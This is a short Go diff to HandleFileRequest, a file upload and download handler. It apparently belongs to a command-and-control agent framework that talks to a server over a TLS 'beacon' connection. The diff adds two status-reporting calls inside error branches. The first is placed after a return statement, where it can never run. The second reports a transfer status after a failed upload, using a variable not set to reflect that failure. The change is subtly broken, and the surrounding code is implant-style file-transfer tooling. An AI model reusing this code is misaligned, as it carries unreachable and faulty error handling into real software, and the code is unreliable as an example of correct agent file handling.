@@ -31,6 +31,7 @@ func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 					err := downloadHandler(fileResponse)
 					if err != nil {
 						return fmt.Errorf("Failed to download file")
+						err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
 					}
 					success = "Success"
 					err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
@@ -43,6 +44,7 @@ func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 					err := uploadHandler(fileResponse, encoder, decoder)
 					if err != nil {
 						logger.Logf(logger.Error, "Error sending file: %v", err)
+						err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
 					}
 				} else {
 					logger.Logf(logger.Info, "No more files to process")
